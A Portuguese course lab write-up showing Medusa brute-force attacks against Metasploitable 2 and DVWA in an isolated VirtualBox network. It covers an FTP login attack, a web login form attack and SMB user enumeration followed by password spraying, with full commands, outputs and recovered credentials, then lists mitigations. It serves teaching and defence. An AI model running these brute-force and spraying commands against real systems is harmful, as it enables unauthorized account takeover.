# 🔐 Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

> Projeto prático desenvolvido como parte do curso de Cibersegurança da [DIO](https://www.dio.me).  
> O objetivo é simular cenários reais de ataque de força bruta em ambiente controlado, documentar os processos e propor medidas de mitigação.

---



## 📋 Índice

1. [Sobre o Projeto](#sobre-o-projeto)
2. [Tipos de Ataque de Força Bruta](#tipos-de-ataque-de-força-bruta)
3. [Ferramentas Estudadas](#ferramentas-estudadas)
4. [Ambiente de Laboratório](#ambiente-de-laboratório)
5. [Cenário 1 — Força Bruta FTP](#cenário-1--força-bruta-ftp)
6. [Cenário 2 — Formulário Web DVWA](#cenário-2--formulário-web-dvwa)
7. [Cenário 3 — Enumeração SMB e Password Spraying](#cenário-3--enumeração-smb-e-password-spraying)
8. [Medidas de Mitigação](#medidas-de-mitigação)
9. [Conclusão](#conclusão)
10. [Referências](#referências)

---

## Sobre o Projeto

Este projeto simula três cenários de ataque de força bruta utilizando o **Kali Linux** e a ferramenta **Medusa**, contra um ambiente vulnerável composto por **Metasploitable 2** e **DVWA** (Damn Vulnerable Web Application), rodando em rede isolada no VirtualBox.

Os cenários cobrem três superfícies de ataque distintas:
- Protocolo FTP (porta 21)
- Formulário de login web (HTTP)
- Protocolo SMB (porta 445) com enumeração prévia de usuários

---

## Tipos de Ataque de Força Bruta

### Ataque de Dicionário
Testa palavras de uma lista pré-montada de senhas comuns. É o mais rápido por não gerar combinações aleatórias, dependendo de a senha estar na lista. Funciona bem porque a maioria das pessoas usa senhas previsíveis. Exemplo de wordlist: `rockyou.txt` (14 milhões de senhas reais vazadas), disponível nativamente no Kali Linux.

### Força Bruta Pura (Permutação)
Testa **todas as combinações possíveis** de caracteres de forma sequencial (`aaa`, `aab`, `aac`...). Garante encontrar qualquer senha, mas o tempo cresce exponencialmente com o tamanho e complexidade dela.

### Ataque Híbrido — Mangling Rules
Pega palavras de um dicionário e aplica transformações automáticas: `senha` → `Senha`, `S3nh@`, `senha123`, `SENHA!`. Imita como humanos "fortalecem" senhas na prática, tornando-o muito eficaz contra políticas de senha simples.

### Junção de Listas
Combina duas ou mais wordlists para criar pares de senhas compostas. Exemplo: lista de nomes + lista de anos → `maria2024`, `joao1990`. Útil quando há contexto sobre o alvo.

### Password Spraying
Em vez de testar muitas senhas em uma conta, testa **uma ou poucas senhas em muitas contas simultaneamente**. Drибla políticas de bloqueio de conta (lockout), pois nunca excede o limite de tentativas por usuário. Muito eficaz em ambientes corporativos onde senhas sazonais são comuns (`Empresa2024!`).

### Credential Stuffing
Utiliza pares reais de login e senha vazados em breaches anteriores. Aposta na reutilização de senhas entre serviços — estudos mostram que mais de 60% das pessoas reutilizam senhas. Diferente do spraying, usa pares reais, não senhas genéricas.

---

## Ferramentas Estudadas

| Ferramenta | Tipo | Uso Principal |
|---|---|---|
| **Medusa** | Brute force online | ✅ Foco do projeto — FTP, HTTP, SMB |
| Hydra | Brute force online | 50+ protocolos, possui interface gráfica (xHydra) |
| Ncrack | Brute force online | Múltiplos hosts simultâneos, redes instáveis |
| Patator | Brute force online | Máxima modularidade e filtros avançados de resposta |
| WPScan | Scanner WordPress | Enumeração e brute force exclusivo para WordPress |
| John the Ripper | Brute force offline | Quebra de hashes locais, mangling rules poderoso |

### Medusa — Ferramenta Principal

O Medusa é uma ferramenta de força bruta online, rápida, paralela e modular. Desenvolvida pela Foofus.net, se destaca pela estabilidade e arquitetura de módulos independentes por protocolo.

**Sintaxe geral:**
```bash
medusa -h [host] -u [usuário] -p [senha] -M [módulo]
```

**Principais flags:**

| Flag | Função |
|---|---|
| `-h` | Host alvo |
| `-H` | Arquivo com lista de hosts |
| `-u` | Usuário único |
| `-U` | Arquivo com lista de usuários |
| `-p` | Senha única |
| `-P` | Arquivo com wordlist de senhas |
| `-M` | Módulo do protocolo (ftp, ssh, smbnt, http...) |
| `-t` | Threads paralelas por host |
| `-T` | Hosts testados simultaneamente |
| `-f` | Para ao encontrar a primeira credencial válida |
| `-O` | Salva resultado em arquivo de log |

---

## Ambiente de Laboratório

### Configuração das VMs

| Máquina | Função | IP |
|---|---|---|
| Kali Linux | Atacante | 192.168.56.100 |
| Metasploitable 2 | Alvo vulnerável | 192.168.56.101 |

- **Hypervisor:** VirtualBox
- **Tipo de rede:** Host-Only Adapter (isolado da internet)
- **DVWA:** hospedado no Metasploitable 2 em `http://192.168.56.101/dvwa`

### Serviços ativos no Metasploitable 2

| Porta | Serviço | Versão |
|---|---|---|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7 |
| 80 | HTTP | Apache 2.2.8 |
| 139/445 | SMB | Samba 3.0.20-Debian |
| 3306 | MySQL | MySQL 5.0 |
| 5900 | VNC | Sem autenticação |

```bash
# Verificar conectividade com o alvo
ping 192.168.56.101

# Mapear serviços ativos
nmap -sV 192.168.56.101
```

---

## Cenário 1 — Força Bruta FTP

### Objetivo
Descobrir credenciais válidas no serviço FTP do Metasploitable 2 utilizando wordlists simples.

### Criando as Wordlists

```bash
# Lista de usuários (users.txt)
echo -e "msfadmin\nadmin\nroot\nuser" > users.txt

# Lista de senhas (passwords.txt)
echo -e "123456\npassword\nqwerty\nmsfadmin" > passwords.txt
```

### Executando o Ataque

```bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
```

### Resultado

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101
User: msfadmin Password: msfadmin [SUCCESS]
```

✅ **Credencial encontrada:** `msfadmin:msfadmin`

![Ataque FTP com Medusa](images/img1.png)

O ataque testou 4 usuários × 4 senhas = 16 combinações e encontrou a credencial válida em poucos segundos. O serviço FTP não possui qualquer mecanismo de bloqueio por tentativas falhas.

---

## Cenário 2 — Formulário Web DVWA

### Objetivo
Automatizar tentativas de login no formulário web do DVWA utilizando o módulo HTTP do Medusa.

### Inspecionando o Formulário

Antes de executar o ataque, é necessário identificar os parâmetros do formulário via **DevTools do navegador (F12 → aba Network)**:

- **URL:** `http://192.168.56.101/dvwa/login.php`
- **Método:** `POST`
- **Parâmetros:** `username`, `password`, `Login`
- **Mensagem de falha:** `Login failed`
- **Status de falha:** HTTP 302 (redirect)

> 💡 A própria página exibe a dica: *"default username is 'admin' with password 'password'"* — um exemplo claro de exposição desnecessária de informações.

![Inspeção do formulário DVWA via DevTools](images/Brute-Force-DVWA.png)

### Executando o Ataque

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' \
  -t 6
```

### Resultado

O Medusa testou 4 usuários × 4 senhas = 16 combinações e encontrou **12 credenciais válidas** em menos de 1 segundo:

| Usuário | Senha |
|---|---|
| `user` | `123456` ✅ |
| `user` | `password` ✅ |
| `user` | `msfadmin` ✅ |
| `user` | `qwerty` ✅ |
| `msfadmin` | `123456` ✅ |
| `msfadmin` | `password` ✅ |
| `msfadmin` | `qwerty` ✅ |
| `msfadmin` | `msfadmin` ✅ |
| `admin` | `123456` ✅ |
| `root` | `123456` ✅ |
| `root` | `password` ✅ |
| `root` | `qwerty` ✅ |

O DVWA sem proteção não implementa rate limiting, bloqueio de conta ou CAPTCHA — todas as combinações foram testadas sem qualquer obstáculo.

![Medusa simulando combinações de acesso no DVWA](images/Medusa-access-combination.png)

---

## Cenário 3 — Enumeração SMB e Password Spraying

### Objetivo
Simular um ataque em cadeia: primeiro enumerar usuários reais do sistema via SMB, depois usar essa lista para um ataque de password spraying direcionado.

### Etapa 1 — Enumeração com enum4linux

```bash
# Enumerar usuários, grupos e shares SMB
enum4linux -U 192.168.56.101
```

A enumeração revelou mais de 30 usuários reais do sistema, incluindo:

```
user:[games]      user:[nobody]    user:[proxy]
user:[www-data]   user:[root]      user:[postgres]
user:[bin]        user:[mail]      user:[msfadmin]
user:[telnetd]    user:[daemon]    user:[sshd]
user:[mysql]      user:[backup]    user:[service]
```

Além dos grupos de domínio:
```
METASPLOITABLE\uucp    METASPLOITABLE\proxy
METASPLOITABLE\kmem    METASPLOITABLE\dialout
METASPLOITABLE\fax     METASPLOITABLE\voice
```

> Em um ambiente corporativo real bem configurado, essas informações **nunca deveriam ser acessíveis anonimamente**.

![Enumeração SMB — cenário corporativo mal configurado](images/Simulating-corporate-scenario.png)

### Etapa 2 — Criando os Arquivos

```bash
# Usuários selecionados da enumeração
echo -e "user\nmsfadmin\nservice" > smb_users.txt

# Senhas candidatas para spraying
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

### Etapa 3 — Password Spraying com Medusa

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

### Resultado

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101
User: msfadmin Password: msfadmin
[SUCCESS (ADMIN$ - Access Allowed)]
```

✅ **Credencial encontrada:** `msfadmin:msfadmin` com **acesso administrativo** (`ADMIN$`).

![Criando lista de usuários e password spraying SMB](images/list-users.png)

### Etapa 4 — Validando o Acesso com SMBClient

```bash
smbclient -L //192.168.56.101 -U msfadmin
# Password: msfadmin
```

**Shares acessíveis após autenticação:**

| Sharename | Tipo | Comentário |
|---|---|---|
| `print$` | Disk | Printer Drivers |
| `tmp` | Disk | oh noes! |
| `opt` | Disk | — |
| `IPC$` | IPC | Samba 3.0.20-Debian |
| `ADMIN$` | IPC | Samba 3.0.20-Debian |
| `msfadmin` | Disk | Home Directories |

> ⚠️ O Samba 3.0.20 (2007) é vulnerável ao **CVE-2007-2447**, que permite execução remota de código sem autenticação.

![Validação de acesso com smbclient](images/Access-test-SMBclient.png)

---

## Medidas de Mitigação

A segurança falha quando o básico é negligenciado. Os três cenários deste projeto foram possíveis por falhas simples e evitáveis:

### Políticas de Senha

- Exigir senhas com no mínimo 12 caracteres, combinando letras maiúsculas, minúsculas, números e símbolos
- Proibir senhas iguais ao nome de usuário (`msfadmin:msfadmin`)
- Proibir senhas em listas de senhas comuns conhecidas
- Forçar troca periódica de senhas e impedir reutilização das últimas N senhas

### Bloqueio Após Falhas de Autenticação

- Implementar lockout após 3 a 5 tentativas falhas consecutivas
- Adicionar tempo de espera progressivo entre tentativas (rate limiting)
- Implementar CAPTCHA em formulários web após falhas repetidas

### Autenticação Multi-Fator (MFA)

- Habilitar MFA em todos os serviços críticos — mesmo que a senha seja descoberta, o atacante não consegue autenticar sem o segundo fator
- Priorizar serviços expostos: VPN, SSH, RDP, painéis web administrativos

### Restrições de Serviço

- Desabilitar enumeração anônima no SMB (`RestrictAnonymous = 2`)
- Desabilitar comandos VRFY e EXPN no SMTP
- Atualizar versões de software — Samba 3.0.20 tem CVEs críticos conhecidos
- Remover hints e mensagens que revelem informações do sistema (como o hint do DVWA em produção)

### Monitoramento e Auditoria

- Implementar SIEM (Security Information and Event Management) para detectar padrões de brute force
- Configurar alertas para múltiplas falhas de autenticação em curto período
- Monitorar tentativas de login fora do horário comercial e de IPs desconhecidos
- Realizar auditorias regulares de contas, permissões e serviços expostos
- Executar pentests periódicos para identificar superfícies de ataque antes de atacantes reais

---

## Conclusão

Este projeto demonstrou na prática como ataques de força bruta exploram falhas básicas de configuração e higiene de segurança. Em todos os três cenários, o sucesso do ataque não dependeu de técnicas sofisticadas — dependeu de:

- Senhas fracas e reutilizadas (`msfadmin:msfadmin`, `admin:password`)
- Ausência de bloqueio por tentativas falhas
- Serviços expondo informações desnecessariamente (enumeração SMB anônima, hints no formulário web)
- Software desatualizado com CVEs conhecidos (Samba 3.0.20)

> *"A qualidade da segurança vai depender do cuidado com detalhes básicos — por meio de profissionais de cibersegurança identificando, explorando e corrigindo vulnerabilidades antes que atacantes reais o façam."*

A segurança não é um produto, é um processo contínuo. Ferramentas como Medusa, Nmap e enum4linux existem para que **defensores** possam enxergar o ambiente com os olhos de um atacante — e corrigir o que for encontrado.

---

## Referências

- [Kali Linux — Site Oficial](https://www.kali.org/)
- [Medusa — Documentação Oficial](http://www.foofus.net/jmk/medusa/medusa.html)
- [DVWA — Damn Vulnerable Web Application](http://www.dvwa.co.uk/)
- [Nmap — Manual Oficial](https://nmap.org/book/)
- [Metasploitable 2 — Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [HaveIBeenPwned — Verificar vazamentos](https://haveibeenpwned.com)
- [CVE-2007-2447 — Samba RCE](https://www.cvedetails.com/cve/CVE-2007-2447/)

---

*Desenvolvido por Fabrício | Curso de Cibersegurança — DIO | Maio 2026*
